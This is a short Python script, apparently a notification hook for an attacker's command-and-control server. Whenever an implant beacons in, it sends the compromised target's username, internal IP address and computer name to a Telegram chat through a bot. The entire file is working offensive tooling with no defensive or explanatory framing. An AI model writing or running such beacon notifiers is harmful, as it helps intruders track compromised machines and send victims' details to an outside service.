#! /usr/bin/env python3
import argparse
import telepot
import socket

chat_id = 'xxx' #userID

bot = telepot.Bot('xxxxxxxx') #token telegram
parser = argparse.ArgumentParser(description='Beacon Info')
parser.add_argument('--computername')
parser.add_argument('--internalip')
parser.add_argument('--username')
args = parser.parse_args()

computername = args.computername
internalip = args.internalip
username = args.username


hostname = socket.gethostname()
message = "Message from "+hostname+" Server\nBeacon succes implant Info Target\nUsername : "+username+"\nIpaddres : "+internalip+"\nComputer name : "+computername+"."
bot.sendMessage(chat_id, message)
